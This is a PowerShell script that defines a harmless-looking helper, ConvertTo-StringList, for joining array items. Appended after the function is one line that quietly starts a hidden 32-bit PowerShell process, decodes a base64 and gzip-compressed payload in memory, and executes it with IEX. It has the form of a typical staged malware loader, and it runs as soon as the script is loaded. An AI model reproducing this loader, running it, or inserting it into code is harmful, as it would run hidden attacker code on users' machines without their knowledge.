﻿function ConvertTo-StringList
{


    [CmdletBinding()]
    [OutputType([string])]
    param
    (
        [Parameter(Mandatory = $true,
                   ValueFromPipeline = $true)]
        [System.Array]$Array,

        [system.string]$Delimiter = ","
    )

    BEGIN { $StringList = "" }
    PROCESS
    {
        Write-Verbose -Message "Array: $Array"
        foreach ($item in $Array)
        {
            
            $StringList += "$item$Delimiter"
        }
        Write-Verbose "StringList: $StringList"
    }
    END
    {
        TRY
        {
            IF ($StringList)
            {
                $lenght = $StringList.Length
                Write-Verbose -Message "StringList Lenght: $lenght"

                
                $StringList.Substring(0, ($lenght - $($Delimiter.length)))
            }
        }
        CATCH
        {
            Write-Warning -Message "[END] Something wrong happening when output the result"
            $Error[0].Exception.Message
        }
        FINALLY
        {
            
            $StringList = ""
        }
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADswgFgCA71WbW/aSBD+nEr9D1aFhK0SDAlt0kiVbm1eEyCAwQQoqrb22l6y9hJ7TTC9/vcbg53Sl5xyd9JZidj1zOw++8wzO3biwBKUB9LDxtLdqdcaz6Wvr1+dDHCIfUku+BOtii5aqCQVgthXTk7AVmBjg7U+exfSR0leoPW6zn1Mg+XVlR6HIQnEYV5uEYGiiPhfGCWRrEh/SlOPhOT09suKWEL6KhU+l1uMf8Esc0t0bHlEOkWBndq63MIptrKxZlTIxU+fisritLosNx5izCK5aCSRIH7ZZqyoSN+UdMNxsiZysUetkEfcEeUpDc7PypMgwg7pw2ob0iPC43ZUVOAk8BcSEYeB9HSmdJGDi1yE4SDkFrLtkEQQUe4EG35PZKCCsZL0h7zIEIziQFCfgF2QkK8NEm6oRaJyGwc2IyPiLOU+ecwP/tIg+TgIvAYiVEqQk2eg9rgdM3KILiq/gn3KpQJPlk8g4dvrV69fObkMwnd469+0ybEIYHSy2I8JIJUHPKJ7349SpST1YD8seJjAtDAOY6IspUWahcVyKRVE8ljttWbnM7/0/CrVPAQC3OTmclSrdDfwfmFyai8hLktVYXWR7Mi2v1t5ndT8vPLqxKEBqScB9qmVi0v+XQ6Iw8j+5OXcrQ8A5WJmIHadMOJikTJakha/hjV8Kp5itZgym4TIgjxGgApSrPwI5pAkudgJesQH1g7zIqTDAUmT3DuTcZLvns7BqagzHEUlaRBDTVklySCYEbskoSCimQnFgu+Hxe9wezET1MKRyJdbKj/RmW2r8yASYWxBPoGCsbEmFsUsZaQktalNtMSgbr598bd86JgxGriw0gbyAW9SHgyRqiQEpEeKUMoGER1/zYgPnvtKbzLsQl1nlbEXF3aJXXwGbi7+g9JTfnJijsBC0g3GRUkyaSjg3ki5flLZfwF0dHkcQ9NDkiVMzqtroSUirYeCtQtG/Na9nIxcPVVwRt+erFAAUc2Q+xqOyPuaIUKgUX6j3lIdwTPrBKxnafe0ih5ptdOD/wk97/D6hX1zvWqrYX3rOagTdXrtQX3Ybtc214ZZE0ajI24GHdFr3K1WBmqPJjMx76D2mFbuZ7Xd+prujC6yZ1v1/U7bPVa07W7l2s6s7jjuhWOMqu+atDvVh1rlDHfrjbg71R61Si1q0Mf2kE6G99dN8WVmMjxxVPeu+gHTbTdcmVXe23UQannn1u7aMVtez05mbfXDtHaPGgjpQcNsavxmpoVooJrYNfm0lmzeT10daU2Lkvlw0tSGw6aGJq3VQ/2D6kLsHfa0qXlG5+u7kQfzJkC4USu1jk12fDYEklocYXcEPq5+ZnkO+NTfIu1tn0dn+F7jSAOf5vwBcM3WzQED+3hyxpHJ+ncYdedJU1Wrs0ENtSt02nJRuiR2tSFG0aa+q6tV0+b29F1/5qjmHbtQ6/p4bTmqqj626zfWvLq9vL247E6p6XM0UVXzTSoT0EmBbFrJg3OU8efu/h4OIw8zUAJc6Hm1NnnYzO7nAadphCwftet7EgaEQZeDPpiLHDHGrbRZPN3n0KwOLWQJZTuB4fnZb0eK9OSofG8i+aurqznghao5VnK5SwJXeKXK9rxSgZZQ2dYqcPKXn1Xn60T+YclS2loy2n7eje13U9LCKgSattP/D16zqvbgx34Jr9/f/Y31RVxXSjkPvxh+fPGPKP+XNEwxFeBvwNXEyKGVPs9GJqjjT5E0XaATJ3vSb8LbWJz24RPlL9ZbtVuKCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
